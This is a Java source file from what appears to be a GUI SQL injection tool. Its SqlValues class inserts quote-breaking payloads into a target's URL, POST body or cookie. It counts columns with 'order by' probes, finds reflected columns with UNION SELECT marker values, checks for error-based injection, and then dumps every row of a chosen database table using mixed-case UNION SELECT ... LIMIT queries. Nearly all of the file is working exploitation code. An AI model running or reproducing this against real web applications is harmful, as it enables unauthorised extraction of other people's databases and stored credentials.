package core;

import base.*;
import errors.*;
import form.BROWindow;
import static form.BROWindow.dataTable;
import form.MyTableModel;
import java.util.ArrayList;
import javax.swing.table.DefaultTableModel;
import struct.*;

public class SqlValues extends SqlInj {

    public String conf_quote = null;
    public int conf_col1 = 1;
    public int conf_col2 = 32;
    public int conf_type = 0;
    public boolean long_analyze = false;
    /////**************////
    private boolean valueError = false;
    protected Boolean canConcat = null;
    private Integer limitCounter = 0;
    private String lastval1 = "";
    private String field1 = "";
    private String toOrder = "";
    private boolean isFirstError = false;

    public boolean checkErrorHTML(String validhtml, String html1, String html2) {
        int normalLen = validhtml.length();
        int len1 = html1.length();
        int len2 = html2.length();

        double per1 = 100 * (((double) len1 - (double) normalLen)) / normalLen;
        double per2 = 100 * (((double) len2 - (double) normalLen)) / normalLen;
        if (this.getHtmlError(html1)) {
            return false;
        }
        if (this.getHtmlError(html2) && !this.getHtmlError(html1)) {
            return true;
        }

        if ((Math.abs(per1) < 2) && (Math.abs(per2) > 4.5)) {
            return true;
        }

        return false;
    }

    public boolean checkErrorLocation(Boolean locValid, Boolean loc1, Boolean loc2) {
        if (fastErr == null) {
            if ((loc1 == false) && (locValid == false) && (loc2 != false)) {
                this.fastErr = true;
                return true;
            }
            return false;
        }

        if (this.fastErr) {
            if ((loc1 == false) && (locValid == false) && (loc2 != false)) {
                return true;
            }
        }
        return false;
    }

    public boolean checkError(String validhtml, String html1, String html2, Boolean locValid, Boolean loc1, Boolean loc2) {
        if ((this.fastErr == null) || (this.fastErr == true)) {
            if (this.fastErr == null) {
                this.fastErr = false;
                if (this.checkErrorLocation(locValid, loc1, loc2)) {
                    this.fastErr = true;
                    return true;
                }
            }

            if (this.fastErr) {
                return this.checkErrorLocation(locValid, loc1, loc2);
            }

        }
        return this.checkErrorHTML(validhtml, html1, html2);
    }

    public boolean checkPageValid(String validhtml, String html, Boolean locValid, Boolean loc) {
        if (this.fastErr) {
            if ((locValid == false) && (loc != false)) {
                return true;
            }
        }

        int normalLen = validhtml.length();
        int len = html.length();

        double per = 100 * (((double) len - (double) normalLen)) / normalLen;
        if (this.getHtmlError(html)) {
            return false;
        }

        if ((Math.abs(per) < 2)) {
            return true;
        }

        return false;
    }

    protected String getTestColumn(int len) {
        String res = "";
        for (int i = 1; i <= len; i++) {
            if (i > 1) {
                res += ",";
            }
            int ost = i % 10;
            int chastnoe = i / 10;
            String column = (ost * 11111111 + chastnoe * 100000000) + "*137";
            res += column;
        }

        return res;
    }

    protected ArrayList getValidColumns(String html, int len) {
        ArrayList res = new ArrayList();
        for (int i = len; i >= 1; i--) {
            int ost = i % 10;
            int chastnoe = i / 10;
            String column = 137 * (long) (ost * 11111111 + chastnoe * 100000000) + "";
            if (html.indexOf(column) != -1) {
                res.add(i);
            }
            html = html.replaceAll(column, "<tested>");
        }

        return res;
    }

    public int checkInject(SqlTest test) throws BrowserException {
        int res = 0;
        this.sql = test;
        this.sql_inj = test.url;
        if ((test.type == 0) && ((this.conf_quote == null) || (this.conf_quote.equals("")))) {
            Helper.log(Lang.get("try_inj_without_quote"));
            res = this.findColumns(test, "");
        };

        if ((res == 0) && ((this.conf_quote == null) || (this.conf_quote.equals("'")))) {
            this.quote = "'";
            Helper.log(Lang.get("try_inj_with_quote", quote));
            res = this.findColumns(test, "'");
        }

        if ((res == 0) && ((this.conf_quote == null) || (this.conf_quote.equals("\"")))) {
            this.quote = "\"";
            Helper.log(Lang.get("try_inj_with_quote", quote));
            res = this.findColumns(test, "\"");
        }

        return res;
    }

    public boolean checkErrorBased() throws BrowserException {
        String db = this.getDB();
        this.db = db;
        if (!db.isEmpty()) {
            return true;
        }
        return false;
    }

    /*
     0 - ничего не найдено
     -1 - ошибка на сервере непонятная
     -2 - редирект на стороннюю страницу
     999 - ошибка типо error_based
     либо количество колонок
     */
    public int findColumns(SqlTest test, String quote) throws BrowserException {
        Browser br = new Browser();
        this.sql = test;
        String url = test.url;
        String param = test.param;
        String poststr = test.poststr;
        String post = test.poststr;
        //int type = test.type;
        type = this.sql.cookiestr.isEmpty() ? 0 : 2;
        if (this.type > 1) {
            this.sql_inj = this.sql.cookiestr;
        }

        type = this.sql.poststr.isEmpty() ? type : 4;
        if (this.type > 3) {
            this.sql_inj = this.sql.poststr;
        }

        boolean has_error_based = false;

        try {
            String testurl = url;
            if (!this.sql.cookiestr.isEmpty()) {
                br.specifyCookie = Helper.replace(sql.cookiestr, "%Inject_Here%", param);
            } else {
                testurl = Helper.replace(url, "%Inject_Here%", param);
                post = Helper.replace(poststr, "%Inject_Here%", param);
            }
            String html = br.excludePost(testurl, post);
            this.htmlValid = html;
            Boolean redirValid = br.hasRedirect;
            int normalLen = html.length();
            String html1, html2;
            int columns = 0;
            if (!this.sql.cookiestr.isEmpty()) {
                br.specifyCookie = Helper.replace(sql.cookiestr, "%Inject_Here%", param + quote + "+order+by+1+--+;");
            } else {
                testurl = Helper.replace(url, "%Inject_Here%", param + quote + "+order+by+1+--+;");
                post = Helper.replace(poststr, "%Inject_Here%", param + quote + "+order+by+1+--+;");
            }
            html1 = br.excludePost(testurl, post);
            Boolean redir1 = br.hasRedirect;
            if (!this.sql.cookiestr.isEmpty()) {
                br.specifyCookie = Helper.replace(sql.cookiestr, "%Inject_Here%", param + quote + "+order+by+999+--+;");
            } else {
                testurl = Helper.replace(url, "%Inject_Here%", param + quote + "+order+by+999+--+;");
                post = Helper.replace(poststr, "%Inject_Here%", param + quote + "+order+by+999+--+;");
            }
            Boolean redir2 = false;
            try {
                html2 = br.excludePost(testurl, post);
                redir2 = br.hasRedirect;
            } catch (BrowserException ex) {
                html2 = "";
            }

            if (this.getHtmlError(html2)) {
                this.type += 1;
                boolean check = this.checkErrorBased();
                if (check) {
                    has_error_based = true;
                }
                this.type -= 1;
            }

            if ((this.checkError(html, html1, html2, redirValid, redir1, redir2)) || (this.long_analyze)) {

                br.follow = this.browserFollow;
                if (this.fastErr) {
                    br.follow = -1;
                }

                int from = this.conf_col1;
                int to = this.conf_col2;
                //int lastval = to;
                //String lasthtml = "";
                //boolean firstfind = true;
                //boolean lastoperation = true;

                columns = from;
                for (int i = from; i <= to; i++) {
                    columns = i;
                    if (!this.sql.cookiestr.isEmpty()) {
                        br.specifyCookie = Helper.replace(sql.cookiestr, "%Inject_Here%", param + quote + "+order+by+" + i + "+--+;");
                    } else {
                        testurl = url.replaceAll("%Inject_Here%", param + quote + "+order+by+" + i + "+--+;");
                        post = poststr.replaceAll("%Inject_Here%", param + quote + "+order+by+" + i + "+--+;");
                    }
                    //
                    html1 = br.excludePost(testurl, post);
                    if ((this.checkPageValid(html, html1, redirValid, br.hasRedirect)) || (this.long_analyze)) {
                        String column = this.getTestColumn(columns);
                        if (!this.sql.cookiestr.isEmpty()) {
                            br.specifyCookie = Helper.replace(sql.cookiestr, "%Inject_Here%", "-" + param + quote + this.union + "+" + this.select + column + "+--+;");
                        } else {
                            testurl = url.replaceAll("%Inject_Here%", "-" + param + quote + this.union + "+" + this.select + column + "+--+;");
                            post = poststr.replaceAll("%Inject_Here%", "-" + param + quote + this.union + "+" + this.select + column + "+--+;");
                        }
                        html1 = br.excludePost(testurl, post);
                        html1 = html1.replaceAll(this.select + column, "<TEST_COLUMN>");
                        ArrayList validColumns = this.getValidColumns(html1, columns);
                        this.validColumns = validColumns;
                        if (this.validColumns.size() > 0) {
                            break;
                        }
                    }
                }

            }

            this.columns = columns;
            if ((this.validColumns != null) && (this.validColumns.size() > 0)) {
                this.valid_column = this.validColumns.get(0);
                return columns;
            } else {
                if (has_error_based) {
                    this.type++;
                    return 999;
                }
                return 0;
            }

        } catch (BrowserException ex) {
            throw new BrowserException("Finish!");
            /*
             if (ex.getMessage().equals("Code >=400!")) {
             return -1;
             } else {
             return -2;
             }
             */
        }
    }

    public String[] getRecordConcat(TableValue tvalue) {
        ArrayList<String> clist = new ArrayList();
        for (int i = 0; i < tvalue.keyvalues.size(); i++) {
            KeyValue kv = tvalue.keyvalues.get(i);
            clist.add(kv.value);
        }

        Browser br = new Browser();
        Hex hex = new Hex();
        String cstr = this.concatColumns(clist);
        String where;
        if (this.lastval1.length() > 0) {
            where = "length(" + this.field1 + ")";
        } else {
            //where = this.field1 + ">0x00";
            where = "length(" + this.field1 + ")";
        }

        try {
            String columns = this.getDataColumn(cstr, true);
            String testurl;// = sql_inj.replaceAll("%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + "fRom+" + tvalue.table + "+where+" + where + "+OrDeR+bY+" + toOrder + "+limit+" + lastlimit + ",1" + ")+--+;");
            int limit = limitCounter;
            String post = this.sql.poststr;

            if ((this.type == 0) || (this.type == 4)) {
                testurl = this.sql.url.replaceAll("%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + "fRom+" + tvalue.table + "+where+" + where + "+gRoUp+By+" + this.field1 + "+OrDeR+bY+" + toOrder + "+limit+" + limit + ",1" + ")+--+;");
                post = this.sql.poststr.replaceAll("%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + "fRom+" + tvalue.table + "+where+" + where + "+gRoUp+By+" + this.field1 + "+OrDeR+bY+" + toOrder + "+limit+" + limit + ",1" + ")+--+;");
            } else {
                testurl = sql.url;
                br.specifyCookie = sql.cookiestr.replaceAll("%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + "fRom+" + tvalue.table + "+where+" + where + "+gRoUp+By+" + this.field1 + "+OrDeR+bY+" + toOrder + "+limit+" + limit + ",1" + ")+--+;");
            }

            String html = br.excludePost(testurl, post);
            String[] res = this.readConcat(html, clist.size());
            for (int k = 0; k < res.length; k++) {
                KeyValue kv = tvalue.keyvalues.get(k);
                if ((!kv.isOpt) && (res[k].isEmpty())) {
                    valueError = true;
                }
                /*
                 if ((!valueError) && (tvalue.posit[k] >= 0)) {
                 if (vsite.validation[tvalue.posit[k]].equals(".*?")) {
                 continue;
                 }
                 if (!res[k].matches(vsite.validation[tvalue.posit[k]])) {
                 valueError = true;
                 }
                 }
                 */
            }
            return res;
        } catch (Exception ex) {
            return null;
        }
    }

    public String[] getRecord1(TableValue tvalue) throws RecordException, BrowserException {
        return this.getRecordN(tvalue);
    }

    public String[] getRecordN(TableValue tvalue) throws RecordException, BrowserException {
        Browser br = new Browser();
        Hex hex = new Hex();
        String[] res = new String[tvalue.keyvalues.size()];
        String where;
        if (this.lastval1.length() > 0) {
            where = this.field1 + ">0x00";

        } else {
            where = this.field1 + ">0x00";
        }
        for (int i = 0; i < res.length; i++) {
            res[i] = "";
        }

        int sAll = tvalue.keyvalues.size();
        int gcount = (this.validColumns != null) ? (this.validColumns.size() > 3 ? 3 : this.validColumns.size()) : 1;
        if (this.type % 2 == 1) {
            gcount = 1;
        }
        for (int j = 0; j < sAll; j += gcount) {
            if (gcount + j >= sAll) {
                gcount = sAll - j;
            }

            KeyValue kv;
            String testurl, html, data, condition;

            ArrayList<String> params = new ArrayList();
            for (int k = 0; k < gcount; k++) {
                kv = tvalue.keyvalues.get(j + k);
                params.add(kv.value);
            }
            try {
                if (j == 0) {
                    int limit = limitCounter;
                    //   if ((!(this.isJoined)) && (this.isFirstError) && (limit == 0)) {
                    //       limit++;
                    //   }
                    condition = "fRom+" + tvalue.table + "+WhErE+" + where + "+gRoUp+By+" + this.field1 + "+OrDeR+bY+" + toOrder + "+limit+" + limit + ",1";
                    kv = tvalue.keyvalues.get(j);
                    //where = kv.value + "=";
                } else {
                    if (Helper.getInt(res[0], -1) == -1) {
                        where = tvalue.keyvalues.get(0).value + "=" + Hex.formatHexShort(res[0]);
                    } else {
                        where = tvalue.keyvalues.get(0).value + "=" + (res[0]);
                    }
                    condition = "fRom+" + tvalue.table + "+WhErE+" + where + "+OrDeR+bY+" + toOrder + "+limit+" + "0,1";
                }

                String[] temp = this.readUrlN(params, condition, j >= 0);
                if (temp == null) {
                    if (j == 0) {
                        return null;
                    }

                    temp = new String[gcount];
                    for (int k = 0; k < gcount; k++) {
                        temp[k] = "";
                    }
                }
                for (int k = 0; k < temp.length; k++) {
                    kv = tvalue.keyvalues.get(j + k);
                    res[j + k] = Hex.unhex(temp[k]);
                    if ((!kv.isOpt) && (res[j + k].isEmpty())) {
                        valueError = true;
                    }
                    /*
                     if ((!valueError) && (tvalue.posit[j + k] >= 0)) {
                     if (!res[j + k].matches(vsite.validation[tvalue.posit[j + k]])) {
                     valueError = true;
                     } else {
                     if ((j == 0) && (k == 0)) {
                     where += hex.formatHex(res[j]);
                     }
                     }
                     }
                     */
                }

            } catch (BrowserException ex) {
                throw ex;
            } catch (Exception ex) {
                throw new RecordException(tvalue.table);
            }

            if ((valueError) && (j == 0)) {
                break;
            }
        }

        return res;
    }

    public String[] getRecord(TableValue tvalue) throws RecordException, BrowserException {
        //TimeThread.activeThread();
        String[] res = null;
        if (this.type % 2 == 1) {
            return this.getRecord1(tvalue);
        }

        if ((this.type % 2 == 0) && (this.canConcat == null)) {
            res = this.getRecordConcat(tvalue);
            //res = null;
            if (res != null) {
                this.canConcat = true;
                return res;
            } else {
                this.canConcat = false;
            }
        }

        if (this.canConcat == true) {
            return this.getRecordConcat(tvalue);
        }

        if (this.type % 2 == 0) {
            if (this.validColumns.size() < 2) {
                return this.getRecordN(tvalue);
            }
            return this.getRecordN(tvalue);
        }
        return res;
    }

    public void getValues(String db, String table, ArrayList<String> fields) throws BrowserException {
        this.limitCounter = 0;
        //ArrayList<String[]> res = new ArrayList();
        this.field1 = fields.get(0);
        TableValue tVal = new TableValue();
        tVal.table = db + "." + table;
        for (int i = 0; i < fields.size(); i++) {
            String field = fields.get(i);
            KeyValue kv = new KeyValue();
            kv.key = field;
            kv.value = field;
            if (i > 0) {
                kv.isOpt = true;
            }
            tVal.keyvalues.add(kv);
        }

        this.toOrder = this.field1;

        String[] columnNames = (String[]) fields.toArray(new String[fields.size()]);
        MyTableModel dTableModel = new MyTableModel(null, columnNames);
        dataTable.setModel(dTableModel);

        //ArrayList<String> params = new ArrayList();
        //params.add("count(*)");
        String tmp = this.queryData("count(distinct+" + this.field1 + ")", "fRom+" + tVal.table);
        int cnt = Helper.getInt(tmp, -1);
        if (cnt < 0) {
            Helper.log(Lang.get("table_count_error", this.field1) + " " + table);
            return;
        }

        Helper.log(Lang.get("table_count", table) + " " + cnt);

        int errLimit = 70;
        int nullcnt = 0;
        int percent = 0;
        int lastpercent = 0;
        int errorCnt = 0;
        int cntAll = cnt;

        for (int i = 0; i < cntAll; i++) {
            this.valueError = false;
            try {
                String[] record = this.getRecord(tVal);
                this.limitCounter++;

                this.isFirstError = false;
                if ((record == null) || (record[0].isEmpty())) {
                    //if (i == 0) {
                    //    this.isFirstError = true;
                    //};
                    nullcnt++;
                    errorCnt++;
                    if (nullcnt > 3) {
                        break;
                    }
                    continue;
                }
                //res.add(record);
                //dataTable.
                DefaultTableModel model = (DefaultTableModel) BROWindow.dataTable.getModel();
                model.addRow((Object[]) record);
                for (int j = 0; j < record.length; j++) {
                    dataTable.setValueAt(record[j], i, j);
                }

                //DefaultTableModel model = (DefaultTableModel) BROWindow.dataTable.getModel();
                //model.a(record);
                nullcnt = 0;
                /*
                 if (lastval1.equals(record[0].trim())) {
                 cntAll++;
                 lastlimit++;
                 } else {
                 lastlimit = 0;
                 }
                 */

                lastval1 = record[0].trim();

                if (this.valueError) {
                    errorCnt++;
                } else {
                    errorCnt = 0;
                }
                String rstr = "";
                for (int j = 0; j < record.length; j++) {
                    if (j > 0) {
                        rstr += ";";
                    }
                    rstr += record[j];
                }

                if (errorCnt > errLimit) {
                    Helper.log(Lang.get("too_many_errors", tVal.table));
                    return;
                }

                percent = ((i + 1) * 100) / cntAll;
                if (percent > lastpercent) {
                    lastpercent = percent;
                    String prgrs = " - (" + (i + 1) + "/" + cnt + ") | " + percent + "%";
                    Helper.log(Lang.get("progress", prgrs));
                }

                if (i >= 1000) {
                    errLimit = 300;
                }

            } catch (BrowserException e) {
                throw e;
            } catch (Exception ex) {
                Helper.log(Lang.get("error"));
                return;
            };

        }

        return;

    }
}
